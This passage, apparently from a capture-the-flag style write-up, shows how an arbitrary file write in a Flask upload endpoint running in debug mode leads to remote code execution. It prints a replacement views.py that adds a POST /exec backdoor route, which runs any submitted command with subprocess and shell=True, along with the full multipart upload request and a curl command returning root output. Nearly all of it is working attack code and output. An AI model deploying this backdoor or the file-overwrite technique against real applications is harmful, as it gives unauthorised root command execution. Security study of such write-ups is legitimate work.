## Adding a Code Execution Endpoint

The file upload endpoint suffers from the same `get_function_name()` and `os.path.join()` sanitization bypass as the file download endpoint, resulting in an arbitrary file write vulnerability.

Enumeration of the web application yielded the `/console` endpoint, which indicates the application is being executed in debug mode. In Flask's debug mode, a change in the source code causes the application to restart so the change can take effect. Thus, by overwriting the application's views in `app/app/views.py` it is possible to achieve remote code execution.

Add in a new endpoint `POST /exec`, which leverages Python's [subprocess](https://docs.python.org/3/library/subprocess.html) module to execute user input.

```python
import os

from app.utils import get_file_name
from flask import render_template, request, send_file

from app import app


@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')


@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))


@app.route("/exec", methods=["POST"])
def run_cmd():
	import subprocess
	return subprocess.check_output(request.form.get("cmd"), shell=True)
```

```http
POST /upcloud HTTP/1.1
Host: 10.129.46.240
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------111377987724099405881201705600
Content-Length: 1107
Origin: http://10.129.46.240
Connection: close
Referer: http://10.129.46.240/upcloud
Upgrade-Insecure-Requests: 1

-----------------------------111377987724099405881201705600
Content-Disposition: form-data; name="file"; filename="/app/app/views.py"
Content-Type: text/plain

import os

from app.utils import get_file_name
from flask import render_template, request, send_file

from app import app


@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')


@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))


@app.route("/exec", methods=["POST"])
def run_cmd():
	import subprocess
	return subprocess.check_output(request.form.get("cmd"), shell=True)

-----------------------------111377987724099405881201705600--
```

Leverage this endpoint for command execution.

```bash
$ curl -X POST -d 'cmd=id' http://10.129.46.240/exec
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```
